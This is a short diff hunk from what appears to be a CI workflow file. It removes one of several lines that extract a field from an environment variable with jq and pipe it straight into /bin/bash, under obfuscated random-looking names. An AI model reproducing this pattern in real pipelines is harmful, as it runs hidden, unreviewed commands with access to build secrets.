@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$zb5915" | jq -r .ptmef69970 | /bin/bash
           printf '%s' "$fxs23730" | jq -r .xyd343 | /bin/bash
           printf '%s' "$cfuhl1" | jq -r .rwx400 | /bin/bash
-          printf '%s' "$ddmlc35854" | jq -r .ovvj56885 | /bin/bash
           printf '%s' "$mr87037" | jq -r .lcnq56744 | /bin/bash
 
       - name: Upload archive
